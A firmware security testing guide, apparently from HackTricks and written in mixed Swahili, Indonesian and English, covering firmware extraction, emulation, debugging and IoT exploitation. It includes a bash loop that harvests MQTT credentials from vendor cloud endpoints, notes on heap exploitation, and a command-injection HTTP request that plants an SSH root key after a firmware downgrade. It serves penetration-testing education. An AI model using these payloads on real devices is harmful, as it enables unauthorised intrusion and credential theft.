# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi kwa usahihi kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji huingiliana nayo. Huhifadhiwa kwenye kumbukumbu ya kudumu, ikihakikisha kifaa kinaweza kufikia maagizo muhimu tangu kinapowashwa, na hivyo kusababisha kuzinduliwa kwa operating system. Kuchunguza na, ikiwezekana, kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.

## **Gathering Information**

**Gathering information** ni hatua ya awali muhimu katika kuelewa muundo wa kifaa na technologies kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- CPU architecture na operating system inayoendesha
- Bootloader specifics
- Hardware layout na datasheets
- Codebase metrics na source locations
- External libraries na license types
- Update histories na regulatory certifications
- Architectural na flow diagrams
- Security assessments na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchambuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na ya kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure inayoweza kutumiwa kupata matatizo yanayoweza kuwepo.

## **Acquiring the Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Directly** kutoka chanzo (developers, manufacturers)
- **Building** kwa kutumia maelekezo yaliyotolewa
- **Downloading** kutoka official support sites
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizohostiwa
- Kufikia **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **updates** kupitia mbinu za man-in-the-middle
- **Extracting** kutoka kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Sniffing** maombi ya update ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Dumping** kutoka bootloader au network
- **Removing and reading** chip ya storage, wakati njia nyingine zote zinashindikana, kwa kutumia zana sahihi za hardware

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili ujue jinsi ya kuishughulikia. Zana mbalimbali unazoweza kutumia kwa hilo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa huoni mengi kwa kutumia zana hizo, kagua **entropy** ya picha kwa `binwalk -E <bin>`, ikiwa ni ya chini, basi huenda haijasimbwa kwa njia ya siri. Ikiwa ni ya juu, inawezekana imesimbwa kwa njia ya siri (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) ili kuchunguza file.

### Kupata Filesystem

Kwa kutumia zana zilizotajwa awali kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kwa kawaida huiweka ndani ya **folder lenye jina la aina ya filesystem**, ambalo mara nyingi huwa moja ya haya yafuatayo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem katika signatures zake**. Katika hali hizi, tumia binwalk ili **kupata offset ya filesystem na carve filesystem iliyobanwa** kutoka kwenye binary na **kutoa manually** filesystem kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha amri ifuatayo ya **dd** kuchonga mfumo wa faili wa Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo inaweza pia kuendeshwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (inayotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye saraka "`squashfs-root`" baada ya hapo.

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na uwezekano wa udhaifu. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ajili ya ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data ya binary, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya uandishi fiche ya image, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini inaonyesha ukosefu wa uandishi fiche, wakati entropy ya juu inaonyesha uwezekano wa uandishi fiche au compression.

Kwa ajili ya kutoa **embedded files**, zana na rasilimali kama hati za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa file zinapendekezwa.

### Extracting the Filesystem

Kwa kutumia `binwalk -ev <bin>`, mara nyingi inawezekana kutoa filesystem, mara nyingi ndani ya directory iliyopewa jina kulingana na aina ya filesystem (kwa mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kutokana na kukosekana kwa magic bytes, extraction ya manual inahitajika. Hii inahusisha kutumia `binwalk` kutambua offset ya filesystem, kisha kufuata na command ya `dd` ili kuchonga filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Sesudah itu, bergantung pada tipe filesystem (misalnya, squashfs, cpio, jffs2, ubifs), perintah yang berbeda digunakan untuk mengekstrak isi secara manual.

### Analisis Filesystem

Setelah filesystem diekstrak, pencarian celah keamanan dimulai. Perhatian diberikan pada network daemons yang tidak aman, hardcoded credentials, API endpoints, fungsi update server, kode yang belum dikompilasi, startup scripts, dan compiled binaries untuk analisis offline.

**Lokasi kunci** dan **item** yang perlu diperiksa meliputi:

- **etc/shadow** dan **etc/passwd** untuk user credentials
- Sertifikat dan key SSL di **etc/ssl**
- File konfigurasi dan script untuk potensi vulnerabilities
- Embedded binaries untuk analisis lebih lanjut
- Web server dan binaries umum pada perangkat IoT

Beberapa tools membantu menemukan informasi sensitif dan vulnerabilities di dalam filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) dan [**Firmwalker**](https://github.com/craigz28/firmwalker) untuk pencarian informasi sensitif
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) untuk analisis firmware menyeluruh
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), dan [**EMBA**](https://github.com/e-m-b-a/emba) untuk analisis statis dan dinamis

### Security Checks on Compiled Binaries

Baik source code maupun compiled binaries yang ditemukan di filesystem harus diteliti untuk vulnerabilities. Tools seperti **checksec.sh** untuk Unix binaries dan **PESecurity** untuk Windows binaries membantu mengidentifikasi unprotected binaries yang dapat dieksploitasi.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Banyak IoT hubs mengambil konfigurasi per-device mereka dari cloud endpoint yang terlihat seperti:

- `https://<api-host>/pf/<deviceId>/<token>`

Selama analisis firmware, Anda mungkin menemukan bahwa `<token>` diturunkan secara lokal dari device ID menggunakan hardcoded secret, misalnya:

- token = MD5( deviceId || STATIC_KEY ) dan direpresentasikan sebagai uppercase hex

Desain ini memungkinkan siapa pun yang mengetahui deviceId dan STATIC_KEY untuk merekonstruksi URL dan mengambil cloud config, yang sering kali mengungkap plaintext MQTT credentials dan topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha pattern ya cloud config URL na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata STATIC_KEY na token algorithm kutoka firmware

- Pakia binaries ndani ya Ghidra/radare2 na utafute path ya config ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Toa token katika Bash na fanya digest kuwa uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kuvuna cloud config na MQTT credentials

- Tengeneza URL na uvute JSON kwa kutumia curl; chambua kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na weak topic ACLs (kama zipo)

- Tumia credentials zilizorejeshwa ku-subscribe kwenye maintenance topics na utafute sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Hesabu device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mazingira mengi hujumuisha vendor OUI/product/type bytes zikifuatiwa na sequential suffix.
- Unaweza kuiterate candidate IDs, derive tokens na fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Maelezo
- Pata kila mara idhini ya wazi kabla ya kujaribu enumeration ya wingi.
- Pendelea emulation au static analysis ili kurejesha secrets bila kurekebisha hardware ya lengwa inapowezekana.


Mchakato wa ku-emulate firmware unawezesha **dynamic analysis** ya uendeshaji wa kifaa au ya programu binafsi. Mbinu hii inaweza kukutana na changamoto za hardware au utegemezi wa architecture, lakini kuhamisha root filesystem au binaries mahususi kwenda kwenye kifaa chenye architecture na endianness vinavyolingana, kama vile Raspberry Pi, au kwenda kwenye virtual machine iliyojengwa tayari, kunaweza kuwezesha majaribio zaidi.

### Ku-emulate Individual Binaries

Kwa kuchunguza programu moja moja, kutambua endianness ya programu na CPU architecture ni muhimu.

#### Mfano na MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana za emulation zinazohitajika:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` inatumika, na kwa binaries za little-endian, `qemu-mipsel` ndio chaguo.

#### ARM Architecture Emulation

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa emulation.

### Full System Emulation

Vifaa kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na vingine, hurahisisha full firmware emulation, kwa ku-automate mchakato na kusaidia katika dynamic analysis.

## Dynamic Analysis in Practice

Katika hatua hii, ama mazingira ya kifaa halisi au yaliyotumiwa kwa emulation hutumika kwa analysis. Ni muhimu kudumisha shell access kwa OS na filesystem. Emulation huenda lisifanane kikamilifu na mwingiliano wa hardware, hivyo wakati mwingine emulation inahitaji kuanzishwa upya. Analysis inapaswa kurudia kuchunguza filesystem, exploit kurasa za wavuti na network services zilizo wazi, na kuchunguza bootloader vulnerabilities. Firmware integrity tests ni muhimu sana ili kutambua uwezekano wa backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis huhusisha kuingiliana na process au binary katika operating environment yake, kwa kutumia tools kama gdb-multiarch, Frida, na Ghidra kwa kuweka breakpoints na kutambua vulnerabilities kupitia fuzzing na techniques nyingine.

Kwa embedded targets bila full debugger, **nakili `gdbserver` iliyounganishwa kwa statically** kwenye kifaa na attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Katika IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na Linux userland process. Workflow yenye manufaa ni kuweka njia kwenye ramani:

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text or TLV protocol** inayotumwa kwenda Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye main daemon
5. **protocol-specific handler / state machine**

Architecture hii huunda reverseing targets mbili badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, pata:

- **message groups** na dispatch tables
- Ni message zipi zinaweza kutoka kwenye **network** dhidi ya controller yenyewe
- Sehemu sahihi za **manufacturer-specific discriminator fields** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazofikiwa tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee hasa, kamata pairing traffic na hakikisha kama target bado inategemea default **Link Key** `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza exposure hii, kwa hiyo tambua kama kifaa kilichojaribiwa kinaforce hilo kweli.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi ni target bora kuliko standardized clusters kwa sababu huletea **custom parsing code** na internal **FSMs** zilizo na validation iliyojaribiwa kidogo.

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Rejesha tables za **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazojiongezea moja kwa moja na retry/error branches ambazo hatimaye hu-reset au hu-free state inayodhibitiwa na attacker.
- Thibitisha ni exchanges zipi halali za protocol zinazohitajika kuweka daemon kwenye vulnerable state badala ya kudhani buggy handler inafikiwa kila wakati.

Kwa timing-sensitive protocols, packet replay kutoka Python framework inaweza kuwa polepole sana. Njia ya kuaminika zaidi ni kuemuleta device halali kwenye real hardware (kwa mfano **nRF52840**) na vendor-grade stack ili uweze kufichua **endpoints**, **attributes**, na commissioning timing sahihi.

### Fragmented-download bug class in embedded daemons

Bug class ya firmware inayojirudia huonekana kwenye **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) huhifadhi `ctx->total_size` na hufanya allocate `malloc(total_size)`.
2. Fragment za baadaye huvalidate tu attacker-controlled **packet-local** fields kama `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia dhidi ya **original allocated size**.

Hii humruhusu attacker kutuma:

- First valid fragment yenye declared total size **ndogo** ili kulazimisha heap allocation ndogo.
- Later fragment yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayokidhi fresh checks huku bado ikifurika originally allocated buffer.

Wakati vulnerable path iko nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha kupeleka target kwenye expected model-download au blob-download state kabla ya kutuma malformed fragments.

### Protocol-driven `free()` triggers

Katika embedded daemons, njia rahisi zaidi ya kuanzisha heap metadata exploitation mara nyingi si "subiri cleanup" bali **lazimisha error handling ya protocol yenyewe**:

- Tuma malformed follow-up fragments ili kusukuma FSM kwenye **retry** au **error** states.
- Zidi retry threshold ili daemon **ireset context** na i-free corrupted buffer.
- Tumia hii `free()` inayotabirika kuanzisha allocator-side primitives kabla process haijavunjika kwa sababu zisizohusiana.

Hii ni muhimu sana dhidi ya **musl/uClibc/dlmalloc-like** allocators kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kugeuza unlink/unbin logic kuwa write primitive. Pattern thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks staged inside the overflowed buffer**, badala ya kuharibu mara moja real bin pointers na ku-crash process.

## Binary Exploitation and Proof-of-Concept

Kukuza PoC kwa vulnerabilities vilivyotambuliwa kunahitaji uelewa wa kina wa target architecture na uprogramu katika lower-level languages. Binary runtime protections kwenye embedded systems ni nadra, lakini vikikuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na glibc. Allocation kubwa ya baadaye inaweza kusababisha `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipitishe checks (size ya kawaida, `fd = 0`, na chunks zinazozunguka kuonekana kama "in use").
- **Non-PIE binaries under ASLR:** ikiwa ASLR imewezeshwa lakini main binary ni **non-PIE**, addresses za ndani ya binary `.data/.bss` ni thabiti. Unaweza kulenga region ambayo tayari inafanana na valid heap chunk header ili kutua fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** JSON inapoparisiwa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikiacha trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka executable shellcode kwenye known mapping na kuruka kwake.

## Prepared Operating Systems for Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa environments zilizoandaliwa awali kwa firmware security testing, zikiwa na tools muhimu.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda mwingi kwa kutoa pre-configured environment yenye tools zote muhimu zilizopakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system inayotegemea Ubuntu 18.04 ikiwa na firmware security testing tools zilizopakiwa awali.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa**. Wakati boot- au recovery-loader inathibitisha tu signature kwa embedded public key lakini hailinganishi *version* (au monotonic counter) ya image inayoflashwa, attacker anaweza kwa halali kusakinisha **older, vulnerable firmware ambayo bado ina valid signature** na hivyo kurudisha vulnerabilities ambazo tayari zilipatchwa.

Typical attack workflow:

1. **Pata older signed image**
* Itoe kutoka vendor’s public download portal, CDN au support site.
* Iitoe kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Irejeshe kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload au serve image kwa device** kupitia channel yoyote ya update iliyo wazi:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* IoT devices nyingi za consumer hutoa *unauthenticated* HTTP(S) endpoints zinazokubali Base64-encoded firmware blobs, huzidecode server-side na ku-trigger recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability ambalo lilipatchwa kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari flash image ya hivi karibuni tena au zima updates ili kuepuka detection baada ya persistence kupatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyopunguzwa toleo), parameta `md5` inaunganishwa moja kwa moja kwenye amri ya shell bila sanitization, na kuruhusu injection ya amri zozote (hapa – kuwezesha SSH key-based root access). Matoleo ya baadaye ya firmware yalileta basic character filter, lakini kukosekana kwa downgrade protection kunafanya fix hiyo isiwe na maana.

### Extracting Firmware From Mobile Apps

Wazalishaji wengi huunganisha full firmware images ndani ya companion mobile applications zao ili app iweze kusasisha device kupitia Bluetooth/Wi-Fi. Packages hizi mara nyingi huhifadhiwa bila encryption ndani ya APK/APEX katika paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata plain `unzip` hukuruhusu kutoa signed images bila kugusa physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kukagua Mantiki ya Usasishaji

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa ipasavyo (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya ku-flash?
* Je, image inathibitishwa ndani ya secure boot chain (mfano, signatures hukaguliwa na ROM code)?
* Je, code ya userland hufanya ukaguzi wa ziada wa mantiki (mfano, allowed partition map, model number)?
* Je, mtiririko wa sasisho wa *partial* au *backup* unatumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa mojawapo ya vitu vilivyo hapo juu havipo, platform pengine inaweza kuwa vulnerable kwa rollback attacks.

## Firmware zilizo vulnerable za kufanya mazoezi

Ili kujifunza kugundua vulnerabilities kwenye firmware, tumia miradi ifuatayo ya firmware vulnerable kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
